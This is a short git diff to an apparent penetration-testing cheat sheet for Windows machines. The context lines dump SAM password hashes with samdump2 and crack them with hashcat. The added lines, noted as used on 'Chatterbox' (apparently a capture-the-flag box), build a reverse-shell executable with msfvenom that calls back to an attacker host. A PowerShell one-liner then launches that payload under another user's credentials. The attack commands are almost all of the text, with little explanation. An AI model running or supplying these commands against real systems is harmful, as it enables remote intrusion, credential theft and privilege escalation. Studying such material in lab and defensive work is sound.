@@ -302,4 +302,11 @@ samdump2 SYSTEM SAM > /tmp/hashes.txt
 hashcat -m 1000 user_hash.txt <password_list.txt>
 ```
 
+Used in ```Chatterbox```
 
+```cmd
+REM create payload
+msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
+REM change user, password and payload
+powershell -c "$password = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<user>', $password);Start-Process -FilePath "<payload>" -Credential $creds"
+```
